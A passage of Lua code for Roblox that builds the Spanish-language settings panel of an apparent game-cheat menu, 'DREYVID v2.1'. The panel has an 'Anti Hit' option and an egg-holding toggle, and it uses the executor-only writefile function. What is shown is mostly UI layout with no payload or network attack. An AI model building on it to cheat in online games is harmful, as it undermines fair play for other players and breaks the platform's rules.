                TextButton3.ZIndex = 3
                TextButton3.Parent = Frame4

                local UICorner6 = Instance.new("UICorner")

                UICorner6.CornerRadius = UDim.new(0, 8)
                UICorner6.Parent = TextButton3
                UIStroke2 = Instance.new("UIStroke")
                UIStroke2.Color = Color3.fromRGB(120, 50, 60)
                UIStroke2.Thickness = 1
                UIStroke2.Transparency = 0.4
                UIStroke2.Parent = TextButton3
                task.spawn(function()
                    while ScreenGui.Parent do
                        t2.value1:Create(UIStroke4, TweenInfo.new(1.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
							Color = Color3.fromRGB(120, 180, 255),
							Transparency = 0.1,
							Thickness = 1.8
						}):Play()
                        task.wait(1.8)
                        t2.value1:Create(UIStroke4, TweenInfo.new(1.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
							Color = Color3.fromRGB(90, 120, 160),
							Transparency = 0.4,
							Thickness = 1.2
						}):Play()
                        task.wait(1.8)
                    end
                end)
                task.spawn(function()
                    local n1 = 0
                    while ScreenGui.Parent do
                        n1 += 1
                        t2.value1:Create(UIGradient, TweenInfo.new(2, Enum.EasingStyle.Linear), {
							Rotation = n1 * 45
						}):Play()
                        task.wait(2)

                        if n1 > 8 then
                        end
                    end
                end)
                UIScale2 = Instance.new("UIScale")
                UIScale2.Scale = v124
                UIScale2.Parent = Frame4
                Frame6 = Instance.new("Frame")
                Frame6.Size = UDim2.fromOffset(360, 460)
                Frame6.Position = UDim2.new(0.5, -180, 0.5, -230)
                Frame6.BackgroundColor3 = Color3.fromRGB(13, 15, 21)
                Frame6.BorderSizePixel = 0
                Frame6.Visible = false
                Frame6.ZIndex = 100
                Frame6.Parent = ScreenGui

                local UICorner7 = Instance.new("UICorner")

                UICorner7.CornerRadius = UDim.new(0, 18)
                UICorner7.Parent = Frame6

                local UIGradient4 = Instance.new("UIGradient")

                UIGradient4.Color = ColorSequence.new({
					ColorSequenceKeypoint.new(0, Color3.fromRGB(28, 32, 46)),
					ColorSequenceKeypoint.new(0.5, Color3.fromRGB(15, 17, 24)),
					ColorSequenceKeypoint.new(1, Color3.fromRGB(22, 24, 34))
				})
                UIGradient4.Rotation = 135
                UIGradient4.Parent = Frame6

                local UIStroke9 = Instance.new("UIStroke")

                UIStroke9.Color = Color3.fromRGB(60, 140, 255)
                UIStroke9.Thickness = 1.5
                UIStroke9.Transparency = 0.15
                UIStroke9.Parent = Frame6

                local UIGradient5 = Instance.new("UIGradient")

                UIGradient5.Color = ColorSequence.new({
					ColorSequenceKeypoint.new(0, Color3.fromRGB(60, 140, 255)),
					ColorSequenceKeypoint.new(0.5, Color3.fromRGB(180, 100, 255)),
					ColorSequenceKeypoint.new(1, Color3.fromRGB(60, 220, 255))
				})
                UIGradient5.Parent = UIStroke9
            end

            do
                local Frame14 = Instance.new("Frame")

                Frame14.Size = UDim2.new(1, 0, 0, 54)
                Frame14.BackgroundColor3 = Color3.fromRGB(20, 22, 30)
                Frame14.BackgroundTransparency = 0.3
                Frame14.BorderSizePixel = 0
                Frame14.ZIndex = 101
                Frame14.Parent = Frame6

                local UICorner = Instance.new("UICorner")

                UICorner.CornerRadius = UDim.new(0, 18)
                UICorner.Parent = Frame14

                local Frame15 = Instance.new("Frame")

                Frame15.Size = UDim2.new(1, 0, 0, 20)
                Frame15.Position = UDim2.new(0, 0, 1, -20)
                Frame15.BackgroundColor3 = Color3.fromRGB(20, 22, 30)
                Frame15.BackgroundTransparency = 0.3
                Frame15.BorderSizePixel = 0
                Frame15.ZIndex = 101
                Frame15.Parent = Frame14

                local Frame16 = Instance.new("Frame")

                Frame16.Size = UDim2.fromOffset(34, 34)
                Frame16.Position = UDim2.new(0, 14, 0.5, -17)
                Frame16.BackgroundColor3 = Color3.fromRGB(30, 40, 60)
                Frame16.BorderSizePixel = 0
                Frame16.ZIndex = 102
                Frame16.Parent = Frame14

                local UICorner8 = Instance.new("UICorner")

                UICorner8.CornerRadius = UDim.new(0, 9)
                UICorner8.Parent = Frame16

                local TextLabel = Instance.new("TextLabel")

                TextLabel.Size = UDim2.fromScale(1, 1)
                TextLabel.BackgroundTransparency = 1
                TextLabel.Text = "âš™"
                TextLabel.TextColor3 = Color3.fromRGB(120, 180, 255)
                TextLabel.Font = Enum.Font.GothamBold
                TextLabel.TextSize = 18
                TextLabel.ZIndex = 103
                TextLabel.Parent = Frame16

                local TextLabel2 = Instance.new("TextLabel")

                TextLabel2.Size = UDim2.new(1, -120, 0, 20)
                TextLabel2.Position = UDim2.new(0, 58, 0, 10)
                TextLabel2.BackgroundTransparency = 1
                TextLabel2.Text = "ConfiguraciÃ³n"
                TextLabel2.TextColor3 = Color3.fromRGB(240, 244, 255)
                TextLabel2.Font = Enum.Font.GothamBold
                TextLabel2.TextSize = 16
                TextLabel2.TextXAlignment = Enum.TextXAlignment.Left
                TextLabel2.ZIndex = 102
                TextLabel2.Parent = Frame14

                local TextLabel3 = Instance.new("TextLabel")

                TextLabel3.Size = UDim2.new(1, -120, 0, 14)
                TextLabel3.Position = UDim2.new(0, 58, 0, 30)
                TextLabel3.BackgroundTransparency = 1
                TextLabel3.Text = "DREYVID Â· v2.1"
                TextLabel3.TextColor3 = Color3.fromRGB(110, 120, 150)
                TextLabel3.Font = Enum.Font.GothamMedium
                TextLabel3.TextSize = 9
                TextLabel3.TextXAlignment = Enum.TextXAlignment.Left
                TextLabel3.ZIndex = 102
                TextLabel3.Parent = Frame14
                TextButton4 = Instance.new("TextButton")
                TextButton4.Size = UDim2.fromOffset(30, 30)
                TextButton4.Position = UDim2.new(1, -42, 0, 12)
                TextButton4.BackgroundColor3 = Color3.fromRGB(60, 25, 30)
                TextButton4.Text = "Ã—"
                TextButton4.TextColor3 = Color3.fromRGB(255, 140, 140)
                TextButton4.Font = Enum.Font.GothamBold
                TextButton4.TextSize = 20
                TextButton4.AutoButtonColor = false
                TextButton4.ZIndex = 102
                TextButton4.Parent = Frame14

                local UICorner9 = Instance.new("UICorner")

                UICorner9.CornerRadius = UDim.new(0, 8)
                UICorner9.Parent = TextButton4
            end

            do
                local Frame17

                do
                    local UIStroke10 = Instance.new("UIStroke")

                    UIStroke10.Color = Color3.fromRGB(120, 50, 60)
                    UIStroke10.Thickness = 1
                    UIStroke10.Transparency = 0.4
                    UIStroke10.Parent = TextButton4

                    local Frame18 = Instance.new("Frame")

                    Frame18.Size = UDim2.new(1, -24, 0, 38)
                    Frame18.Position = UDim2.new(0, 12, 0, 66)
                    Frame18.BackgroundColor3 = Color3.fromRGB(20, 22, 30)
                    Frame18.BackgroundTransparency = 0.5
                    Frame18.BorderSizePixel = 0
                    Frame18.ZIndex = 101
                    Frame18.Parent = Frame6

                    local UICorner = Instance.new("UICorner")

                    UICorner.CornerRadius = UDim.new(0, 10)
                    UICorner.Parent = Frame18

                    local UIPadding = Instance.new("UIPadding")

                    UIPadding.PaddingLeft = UDim.new(0, 4)
                    UIPadding.PaddingRight = UDim.new(0, 4)
                    UIPadding.PaddingTop = UDim.new(0, 4)
                    UIPadding.PaddingBottom = UDim.new(0, 4)
                    UIPadding.Parent = Frame18

                    local UIListLayout = Instance.new("UIListLayout")

                    UIListLayout.FillDirection = Enum.FillDirection.Horizontal
                    UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
                    UIListLayout.Padding = UDim.new(0, 4)
                    UIListLayout.Parent = Frame18

                    local function v187(p23, p24)
                        local TextButton7 = Instance.new("TextButton")

                        TextButton7.Size = UDim2.new(0.25, -3, 1, 0)
                        TextButton7.BackgroundColor3 = Color3.fromRGB(30, 35, 48)
                        TextButton7.BackgroundTransparency = 0.5
                        TextButton7.Text = p23
                        TextButton7.TextColor3 = Color3.fromRGB(180, 180, 200)
                        TextButton7.Font = Enum.Font.GothamBold
                        TextButton7.TextSize = 12
                        TextButton7.AutoButtonColor = false
                        TextButton7.ZIndex = 102
                        TextButton7.LayoutOrder = p24
                        TextButton7.Parent = Frame18

                        local UICorner10 = Instance.new("UICorner")

                        UICorner10.CornerRadius = UDim.new(0, 8)
                        UICorner10.Parent = TextButton7

                        local UIStroke11 = Instance.new("UIStroke")

                        UIStroke11.Color = Color3.fromRGB(70, 90, 130)
                        UIStroke11.Thickness = 1
                        UIStroke11.Transparency = 0.6
                        UIStroke11.Parent = TextButton7

                        return TextButton7, UIStroke11
                    end

                    v188, v189 = v187("Funciones", 1)
                    v190, v191 = v187("TamaÃ±o", 2)
                    v192, v193 = v187("Soporte", 3)
                    v194, v195 = v187("Info", 4)
                    Frame7 = Instance.new("Frame")
                    Frame7.Size = UDim2.new(1, -24, 1, -124)
                    Frame7.Position = UDim2.new(0, 12, 0, 114)
                    Frame7.BackgroundTransparency = 1
                    Frame7.ZIndex = 101
                    Frame7.Parent = Frame6
                    Frame8 = Instance.new("Frame")
                    Frame8.Size = UDim2.new(1, 0, 1, 0)
                    Frame8.BackgroundTransparency = 1
                    Frame8.Visible = true
                    Frame8.ZIndex = 102
                    Frame8.Parent = Frame7

                    local TextLabel = Instance.new("TextLabel")

                    TextLabel.Size = UDim2.new(1, 0, 0, 16)
                    TextLabel.Position = UDim2.new(0, 0, 0, 0)
                    TextLabel.BackgroundTransparency = 1
                    TextLabel.Text = "FUNCIONES DISPONIBLES"
                    TextLabel.TextColor3 = Color3.fromRGB(120, 180, 255)
                    TextLabel.Font = Enum.Font.GothamBold
                    TextLabel.TextSize = 10
                    TextLabel.TextXAlignment = Enum.TextXAlignment.Left
                    TextLabel.ZIndex = 103
                    TextLabel.Parent = Frame8
                    Frame17 = Instance.new("Frame")
                    Frame17.Size = UDim2.new(1, 0, 0, 78)
                    Frame17.Position = UDim2.new(0, 0, 0, 26)
                    Frame17.BackgroundColor3 = Color3.fromRGB(22, 24, 34)
                    Frame17.BackgroundTransparency = 0.2
                    Frame17.BorderSizePixel = 0
                    Frame17.ZIndex = 102
                    Frame17.Parent = Frame8

                    local UICorner11 = Instance.new("UICorner")

                    UICorner11.CornerRadius = UDim.new(0, 12)
                    UICorner11.Parent = Frame17

                    local UIStroke12 = Instance.new("UIStroke")

                    UIStroke12.Color = Color3.fromRGB(70, 90, 130)
                    UIStroke12.Thickness = 1
                    UIStroke12.Transparency = 0.4
                    UIStroke12.Parent = Frame17
                end

                local Frame19 = Instance.new("Frame")

                Frame19.Size = UDim2.fromOffset(50, 50)
                Frame19.Position = UDim2.new(0, 14, 0.5, -25)
                Frame19.BackgroundColor3 = Color3.fromRGB(28, 34, 48)
                Frame19.BorderSizePixel = 0
                Frame19.ZIndex = 103
                Frame19.Parent = Frame17

                local UICorner = Instance.new("UICorner")

                UICorner.CornerRadius = UDim.new(0, 10)
                UICorner.Parent = Frame19

                local UIStroke13 = Instance.new("UIStroke")

                UIStroke13.Color = Color3.fromRGB(120, 180, 255)
                UIStroke13.Thickness = 1
                UIStroke13.Transparency = 0.4
                UIStroke13.Parent = Frame19

                local TextLabel = Instance.new("TextLabel")

                TextLabel.Size = UDim2.fromScale(1, 1)
                TextLabel.BackgroundTransparency = 1
                TextLabel.Text = "â†‘"
                TextLabel.TextColor3 = Color3.fromRGB(120, 200, 255)
                TextLabel.Font = Enum.Font.GothamBlack
                TextLabel.TextSize = 28
                TextLabel.ZIndex = 104
                TextLabel.Parent = Frame19

                local TextLabel4 = Instance.new("TextLabel")

                TextLabel4.Size = UDim2.new(1, -110, 0, 18)
                TextLabel4.Position = UDim2.new(0, 76, 0, 16)
                TextLabel4.BackgroundTransparency = 1
                TextLabel4.Text = "Agarra el huevo mÃ¡s tiempo"
                TextLabel4.TextColor3 = Color3.fromRGB(240, 244, 255)
                TextLabel4.Font = Enum.Font.GothamBold
                TextLabel4.TextSize = 13
                TextLabel4.TextXAlignment = Enum.TextXAlignment.Left
                TextLabel4.ZIndex = 103
                TextLabel4.Parent = Frame17

                local TextLabel5 = Instance.new("TextLabel")

                TextLabel5.Size = UDim2.new(1, -110, 0, 14)
                TextLabel5.Position = UDim2.new(0, 76, 0, 36)
                TextLabel5.BackgroundTransparency = 1
                TextLabel5.Text = "Sube y se queda arriba"
                TextLabel5.TextColor3 = Color3.fromRGB(140, 150, 170)
                TextLabel5.Font = Enum.Font.GothamMedium
                TextLabel5.TextSize = 10
                TextLabel5.TextXAlignment = Enum.TextXAlignment.Left
                TextLabel5.ZIndex = 103
                TextLabel5.Parent = Frame17
                TextButton5 = Instance.new("TextButton")
                TextButton5.Size = UDim2.fromOffset(60, 26)
                TextButton5.Position = UDim2.new(1, -75, 0.5, -13)
                TextButton5.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
                TextButton5.BorderSizePixel = 0
                TextButton5.Text = ""
                TextButton5.AutoButtonColor = false
                TextButton5.ZIndex = 103
                TextButton5.Parent = Frame17

                local UICorner12 = Instance.new("UICorner")

                UICorner12.CornerRadius = UDim.new(1, 0)
                UICorner12.Parent = TextButton5
                UIStroke3 = Instance.new("UIStroke")
                UIStroke3.Color = Color3.fromRGB(90, 90, 110)
                UIStroke3.Thickness = 1
                UIStroke3.Transparency = 0.3
                UIStroke3.Parent = TextButton5
                Frame9 = Instance.new("Frame")
                Frame9.Size = UDim2.fromOffset(20, 20)
                Frame9.Position = UDim2.new(0, 3, 0.5, -10)
                Frame9.BackgroundColor3 = Color3.fromRGB(200, 200, 210)
                Frame9.BorderSizePixel = 0
                Frame9.ZIndex = 104
                Frame9.Parent = TextButton5

                local UICorner13 = Instance.new("UICorner")

                UICorner13.CornerRadius = UDim.new(1, 0)
                UICorner13.Parent = Frame9
                Frame10 = Instance.new("Frame")
                Frame10.Size = UDim2.new(1, 0, 1, 0)
                Frame10.BackgroundTransparency = 1
                Frame10.Visible = false
                Frame10.ZIndex = 102
                Frame10.Parent = Frame7

                local TextLabel6 = Instance.new("TextLabel")

                TextLabel6.Size = UDim2.new(1, 0, 0, 16)
                TextLabel6.Position = UDim2.new(0, 0, 0, 0)
                TextLabel6.BackgroundTransparency = 1
                TextLabel6.Text = "TAMAÃ‘O POR PANEL"
                TextLabel6.TextColor3 = Color3.fromRGB(120, 180, 255)
                TextLabel6.Font = Enum.Font.GothamBold
                TextLabel6.TextSize = 10
                TextLabel6.TextXAlignment = Enum.TextXAlignment.Left
                TextLabel6.ZIndex = 103
                TextLabel6.Parent = Frame10

                local TextLabel7 = Instance.new("TextLabel")

                TextLabel7.Size = UDim2.new(1, 0, 0, 26)
                TextLabel7.Position = UDim2.new(0, 0, 0, 20)
                TextLabel7.BackgroundTransparency = 1
                TextLabel7.Text = "Cambia el tamaÃ±o de cada panel sin moverlo de su posiciÃ³n"
                TextLabel7.TextColor3 = Color3.fromRGB(140, 150, 170)
                TextLabel7.Font = Enum.Font.GothamMedium
                TextLabel7.TextSize = 10
                TextLabel7.TextWrapped = true
                TextLabel7.TextXAlignment = Enum.TextXAlignment.Left
                TextLabel7.TextYAlignment = Enum.TextYAlignment.Top
                TextLabel7.ZIndex = 103
                TextLabel7.Parent = Frame10
            end

            local UIScale3, UIScale4, Frame20, Frame21, Frame22

            do
                local Frame23

                do
                    local Frame24 = Instance.new("Frame")

                    Frame24.Size = UDim2.new(1, 0, 0, 90)
                    Frame24.Position = UDim2.new(0, 0, 0, 52)
                    Frame24.BackgroundColor3 = Color3.fromRGB(20, 22, 30)
                    Frame24.BackgroundTransparency = 0.4
                    Frame24.BorderSizePixel = 0
                    Frame24.ZIndex = 102
                    Frame24.Parent = Frame10

                    local UICorner = Instance.new("UICorner")

                    UICorner.CornerRadius = UDim.new(0, 10)
                    UICorner.Parent = Frame24

                    local TextLabel = Instance.new("TextLabel")

                    TextLabel.Size = UDim2.new(1, -20, 0, 14)
                    TextLabel.Position = UDim2.new(0, 10, 0, 6)
                    TextLabel.BackgroundTransparency = 1
                    TextLabel.Text = "PREVIEW"
                    TextLabel.TextColor3 = Color3.fromRGB(120, 130, 160)
                    TextLabel.Font = Enum.Font.GothamBold
                    TextLabel.TextSize = 9
                    TextLabel.TextXAlignment = Enum.TextXAlignment.Left
                    TextLabel.ZIndex = 103
                    TextLabel.Parent = Frame24

                    local Frame25 = Instance.new("Frame")

                    Frame25.Size = UDim2.fromOffset(120, 50)
                    Frame25.Position = UDim2.new(0, 15, 0.5, -18)
                    Frame25.BackgroundColor3 = Color3.fromRGB(15, 17, 23)
                    Frame25.BorderSizePixel = 0
                    Frame25.ZIndex = 103
                    Frame25.Parent = Frame24

                    local UICorner14 = Instance.new("UICorner")

                    UICorner14.CornerRadius = UDim.new(0, 8)
                    UICorner14.Parent = Frame25

                    local UIStroke14 = Instance.new("UIStroke")

                    UIStroke14.Color = Color3.fromRGB(60, 140, 255)
                    UIStroke14.Thickness = 1
                    UIStroke14.Transparency = 0.3
                    UIStroke14.Parent = Frame25

                    local Frame26 = Instance.new("Frame")

                    Frame26.Size = UDim2.fromOffset(4, 4)
                    Frame26.Position = UDim2.new(0, 8, 0, 8)
                    Frame26.BackgroundColor3 = Color3.fromRGB(50, 220, 130)
                    Frame26.BorderSizePixel = 0
                    Frame26.ZIndex = 104
                    Frame26.Parent = Frame25

                    local UICorner15 = Instance.new("UICorner")

                    UICorner15.CornerRadius = UDim.new(1, 0)
                    UICorner15.Parent = Frame26

                    local TextLabel8 = Instance.new("TextLabel")

                    TextLabel8.Size = UDim2.new(1, -20, 0, 10)
                    TextLabel8.Position = UDim2.new(0, 16, 0, 5)
                    TextLabel8.BackgroundTransparency = 1
                    TextLabel8.Text = "Anti Hit"
                    TextLabel8.TextColor3 = Color3.fromRGB(240, 244, 255)
                    TextLabel8.Font = Enum.Font.GothamBold
                    TextLabel8.TextSize = 8
                    TextLabel8.TextXAlignment = Enum.TextXAlignment.Left
                    TextLabel8.ZIndex = 104
                    TextLabel8.Parent = Frame25

                    local Frame27 = Instance.new("Frame")

                    Frame27.Size = UDim2.new(1, -16, 0, 14)
                    Frame27.Position = UDim2.new(0, 8, 1, -20)
                    Frame27.BackgroundColor3 = Color3.fromRGB(40, 25, 30)
                    Frame27.BorderSizePixel = 0
                    Frame27.ZIndex = 104
                    Frame27.Parent = Frame25

                    local UICorner16 = Instance.new("UICorner")

                    UICorner16.CornerRadius = UDim.new(0, 4)
                    UICorner16.Parent = Frame27
                    UIScale3 = Instance.new("UIScale")
                    UIScale3.Scale = 1
                    UIScale3.Parent = Frame25
                    Frame23 = Instance.new("Frame")
                    Frame23.Size = UDim2.fromOffset(100, 50)
                    Frame23.Position = UDim2.new(1, -115, 0.5, -18)
                    Frame23.BackgroundColor3 = Color3.fromRGB(15, 17, 23)
                    Frame23.BorderSizePixel = 0
                    Frame23.ZIndex = 103
                    Frame23.Parent = Frame24
                end

                local UICorner = Instance.new("UICorner")

                UICorner.CornerRadius = UDim.new(0, 8)
                UICorner.Parent = Frame23

                local UIStroke15 = Instance.new("UIStroke")

                UIStroke15.Color = Color3.fromRGB(120, 180, 255)
                UIStroke15.Thickness = 1
                UIStroke15.Transparency = 0.3
                UIStroke15.Parent = Frame23

                local Frame28 = Instance.new("Frame")

                Frame28.Size = UDim2.fromOffset(4, 4)
                Frame28.Position = UDim2.new(0, 8, 0, 8)
                Frame28.BackgroundColor3 = Color3.fromRGB(50, 220, 130)
                Frame28.BorderSizePixel = 0
                Frame28.ZIndex = 104
                Frame28.Parent = Frame23

                local UICorner17 = Instance.new("UICorner")

                UICorner17.CornerRadius = UDim.new(1, 0)
                UICorner17.Parent = Frame28

                local TextLabel = Instance.new("TextLabel")

                TextLabel.Size = UDim2.new(1, -20, 0, 10)
                TextLabel.Position = UDim2.new(0, 16, 0, 5)
                TextLabel.BackgroundTransparency = 1
                TextLabel.Text = "Huevo"
                TextLabel.TextColor3 = Color3.fromRGB(240, 244, 255)
                TextLabel.Font = Enum.Font.GothamBold
                TextLabel.TextSize = 8
                TextLabel.TextXAlignment = Enum.TextXAlignment.Left
                TextLabel.ZIndex = 104
                TextLabel.Parent = Frame23

                local Frame29 = Instance.new("Frame")

                Frame29.Size = UDim2.new(1, -16, 0, 14)
                Frame29.Position = UDim2.new(0, 8, 1, -20)
                Frame29.BackgroundColor3 = Color3.fromRGB(20, 45, 35)
                Frame29.BorderSizePixel = 0
                Frame29.ZIndex = 104
                Frame29.Parent = Frame23

                local UICorner18 = Instance.new("UICorner")

                UICorner18.CornerRadius = UDim.new(0, 4)
                UICorner18.Parent = Frame29
                UIScale4 = Instance.new("UIScale")
                UIScale4.Scale = 1
                UIScale4.Parent = Frame23

                local TextLabel9 = Instance.new("TextLabel")

                TextLabel9.Size = UDim2.new(1, 0, 0, 16)
                TextLabel9.Position = UDim2.new(0, 0, 0, 152)
                TextLabel9.BackgroundTransparency = 1
                TextLabel9.Text = "AJUSTA EL TAMAÃ‘O"
                TextLabel9.TextColor3 = Color3.fromRGB(140, 150, 170)
                TextLabel9.Font = Enum.Font.GothamBold
                TextLabel9.TextSize = 10
                TextLabel9.TextXAlignment = Enum.TextXAlignment.Left
                TextLabel9.ZIndex = 103
                TextLabel9.Parent = Frame10
                Frame20 = Instance.new("Frame")
                Frame20.Size = UDim2.new(1, 0, 0, 8)
                Frame20.Position = UDim2.new(0, 0, 0, 174)
                Frame20.BackgroundColor3 = Color3.fromRGB(30, 35, 48)
                Frame20.BorderSizePixel = 0
                Frame20.ZIndex = 103
                Frame20.Parent = Frame10

                local UICorner19 = Instance.new("UICorner")

                UICorner19.CornerRadius = UDim.new(1, 0)
                UICorner19.Parent = Frame20
                Frame21 = Instance.new("Frame")
                Frame21.BackgroundColor3 = Color3.fromRGB(60, 140, 255)
                Frame21.BorderSizePixel = 0
                Frame21.ZIndex = 104
                Frame21.Parent = Frame20

                local UICorner20 = Instance.new("UICorner")

                UICorner20.CornerRadius = UDim.new(1, 0)
                UICorner20.Parent = Frame21
                Frame22 = Instance.new("Frame")
                Frame22.Size = UDim2.fromOffset(18, 18)
                Frame22.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                Frame22.BorderSizePixel = 0
                Frame22.ZIndex = 105
                Frame22.Parent = Frame20

                local UICorner21 = Instance.new("UICorner")

                UICorner21.CornerRadius = UDim.new(1, 0)
                UICorner21.Parent = Frame22
            end

            local UIStroke16 = Instance.new("UIStroke")

            UIStroke16.Color = Color3.fromRGB(60, 140, 255)
            UIStroke16.Thickness = 2
            UIStroke16.Transparency = 0.3
            UIStroke16.Parent = Frame22

            local TextLabel = Instance.new("TextLabel")

            TextLabel.Size = UDim2.new(1, 0, 0, 20)
            TextLabel.Position = UDim2.new(0, 0, 0, 196)
            TextLabel.BackgroundTransparency = 1
            TextLabel.Text = "100%"
            TextLabel.TextColor3 = Color3.fromRGB(240, 244, 255)
            TextLabel.Font = Enum.Font.GothamBold
            TextLabel.TextSize = 16
            TextLabel.TextXAlignment = Enum.TextXAlignment.Center
            TextLabel.ZIndex = 103
            TextLabel.Parent = Frame10

            local function v246(p25, p26)
                UIScale.Scale = p25
                UIScale2.Scale = p25
                UIScale3.Scale = p25
                UIScale4.Scale = p25

                local v451 = math.clamp((p25 - 0.7) / 0.44999999999999996, 0, 1)

                Frame21.Size = UDim2.new(v451, 0, 1, 0)
                Frame22.Position = UDim2.new(v451, -9, 0.5, -9)
                TextLabel.Text = tostring((math.floor(p25 * 100 + 0.5))) .. "%"

                if p26 then
                    local v452 = p25

                    if writefile then
                        pcall(function()
                            writefile("dreyvid_config_v2.txt", (tostring(v452)))
                        end)
                    end
                end
            end

            local v247 = (v124 - 0.7) / 0.44999999999999996

            Frame21.Size = UDim2.new(math.clamp(v247, 0, 1), 0, 1, 0)
            Frame22.Position = UDim2.new(math.clamp(v247, 0, 1), -9, 0.5, -9)
            TextLabel.Text = tostring((math.floor(v124 * 100 + 0.5))) .. "%"
            UIScale3.Scale = v124
            UIScale4.Scale = v124
            Frame20.InputBegan:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                    local v454 = math.clamp((t2.value9:GetMouseLocation().X - Frame20.AbsolutePosition.X) / Frame20.AbsoluteSize.X, 0, 1) * 0.44999999999999996 + 0.7

                    v246(v454, false)

                    local connection = t2.value9.InputChanged:Connect(function(input2)
                        if input2.UserInputType == Enum.UserInputType.MouseMovement or input2.UserInputType == Enum.UserInputType.Touch then
                            local v545 = math.clamp((t2.value9:GetMouseLocation().X - Frame20.AbsolutePosition.X) / Frame20.AbsoluteSize.X, 0, 1) * 0.44999999999999996 + 0.7

                            v246(v545, false)
                        end
                    end)

                    t2.value9.InputEnded:Connect(function(input3)
                        if input3 == input then
                            local v547 = math.clamp((t2.value9:GetMouseLocation().X - Frame20.AbsolutePosition.X) / Frame20.AbsoluteSize.X, 0, 1) * 0.44999999999999996 + 0.7

                            v246(v547, true)
                            connection:Disconnect()
                            endConn:Disconnect()
                        end
                    end)
                end
            end)

            local TextButton8 = Instance.new("TextButton")

            TextButton8.Size = UDim2.new(1, 0, 0, 28)
            TextButton8.Position = UDim2.new(0, 0, 0, 224)
            TextButton8.BackgroundColor3 = Color3.fromRGB(30, 40, 55)
            TextButton8.Text = "Restablecer (100%)"
            TextButton8.TextColor3 = Color3.fromRGB(180, 200, 230)
            TextButton8.Font = Enum.Font.GothamBold
            TextButton8.TextSize = 11
            TextButton8.AutoButtonColor = false
            TextButton8.ZIndex = 103
            TextButton8.Parent = Frame10

            local UICorner = Instance.new("UICorner")

            UICorner.CornerRadius = UDim.new(0, 8)
            UICorner.Parent = TextButton8
            TextButton8.MouseButton1Click:Connect(function()
                v246(1, true)
            end)
            Frame11 = Instance.new("Frame")
            Frame11.Size = UDim2.new(1, 0, 1, 0)
            Frame11.BackgroundTransparency = 1
            Frame11.Visible = false
            Frame11.ZIndex = 102
            Frame11.Parent = Frame7

            local Frame30 = Instance.new("Frame")

            Frame30.Size = UDim2.fromOffset(50, 50)
            Frame30.Position = UDim2.new(0.5, -25, 0, 0)
            Frame30.BackgroundColor3 = Color3.fromRGB(30, 40, 60)
            Frame30.BorderSizePixel = 0
            Frame30.ZIndex = 103
            Frame30.Parent = Frame11

            local UICorner22 = Instance.new("UICorner")

            UICorner22.CornerRadius = UDim.new(0, 12)
            UICorner22.Parent = Frame30

            local TextLabel10 = Instance.new("TextLabel")

            TextLabel10.Size = UDim2.fromScale(1, 1)
            TextLabel10.BackgroundTransparency = 1
            TextLabel10.Text = "ðŸ’¡"
            TextLabel10.Font = Enum.Font.GothamBold
            TextLabel10.TextSize = 28
            TextLabel10.ZIndex = 104
            TextLabel10.Parent = Frame30

            local TextLabel11 = Instance.new("TextLabel")

            TextLabel11.Size = UDim2.new(1, 0, 0, 22)
            TextLabel11.Position = UDim2.new(0, 0, 0, 60)
            TextLabel11.BackgroundTransparency = 1
            TextLabel11.Text = "Danos tus sugerencias"
            TextLabel11.TextColor3 = Color3.fromRGB(240, 244, 255)
            TextLabel11.Font = Enum.Font.GothamBold
            TextLabel11.TextSize = 15
            TextLabel11.ZIndex = 103
            TextLabel11.Parent = Frame11

            local TextLabel12 = Instance.new("TextLabel")

            TextLabel12.Size = UDim2.new(1, 0, 0, 40)
            TextLabel12.Position = UDim2.new(0, 0, 0, 88)
            TextLabel12.BackgroundTransparency = 1
            TextLabel12.Text = "Â¿QuÃ© te gustarÃ­a que aÃ±adamos en la prÃ³xima actualizaciÃ³n v3?"
            TextLabel12.TextColor3 = Color3.fromRGB(160, 170, 200)
            TextLabel12.Font = Enum.Font.GothamMedium
            TextLabel12.TextSize = 12
            TextLabel12.TextWrapped = true
            TextLabel12.ZIndex = 103
            TextLabel12.Parent = Frame11
            TextButton6 = Instance.new("TextButton")
            TextButton6.Size = UDim2.new(1, 0, 0, 54)
            TextButton6.Position = UDim2.new(0, 0, 0, 140)
            TextButton6.BackgroundColor3 = Color3.fromRGB(45, 60, 90)
            TextButton6.Text = "Ãšnete aquÃ­"
            TextButton6.TextColor3 = Color3.fromRGB(180, 210, 255)
            TextButton6.Font = Enum.Font.GothamBold
            TextButton6.TextSize = 15
            TextButton6.AutoButtonColor = false
            TextButton6.ZIndex = 103
            TextButton6.Parent = Frame11

            local UICorner23 = Instance.new("UICorner")

            UICorner23.CornerRadius = UDim.new(0, 12)
            UICorner23.Parent = TextButton6
        end

        local UIStroke17 = Instance.new("UIStroke")

        UIStroke17.Color = Color3.fromRGB(90, 130, 200)
        UIStroke17.Thickness = 1
        UIStroke17.Transparency = 0.2
        UIStroke17.Parent = TextButton6

        local ImageLabel = Instance.new("ImageLabel")

        ImageLabel.Size = UDim2.fromOffset(32, 32)
        ImageLabel.Position = UDim2.new(0, 16, 0.5, -16)
        ImageLabel.BackgroundTransparency = 1
        ImageLabel.Image = "rbxassetid://93628638506572"
        ImageLabel.ImageColor3 = Color3.fromRGB(180, 210, 255)
        ImageLabel.ScaleType = Enum.ScaleType.Fit
        ImageLabel.ZIndex = 104
        ImageLabel.Parent = TextButton6
        TextButton6.MouseButton1Click:Connect(function()
            if not pcall(function()
                t2.value11:OpenBrowserWindow(t2.value15)
            end) then
                t2.value16(t2.value15)
            end
        end)
        TextButton6.MouseEnter:Connect(function()
            t2.value1:Create(TextButton6, TweenInfo.new(0.2), {
				BackgroundColor3 = Color3.fromRGB(60, 80, 120)
			}):Play()
        end)
        TextButton6.MouseLeave:Connect(function()
            t2.value1:Create(TextButton6, TweenInfo.new(0.2), {
				BackgroundColor3 = Color3.fromRGB(45, 60, 90)
			}):Play()
        end)

        local Frame31 = Instance.new("Frame")

        Frame31.Size = UDim2.new(1, 0, 1, 0)
        Frame31.BackgroundTransparency = 1
        Frame31.Visible = false
        Frame31.ZIndex = 102
        Frame31.Parent = Frame7

        local Frame32 = Instance.new("Frame")

        Frame32.Size = UDim2.fromOffset(50, 50)
        Frame32.Position = UDim2.new(0.5, -25, 0, 0)
        Frame32.BackgroundColor3 = Color3.fromRGB(30, 40, 60)
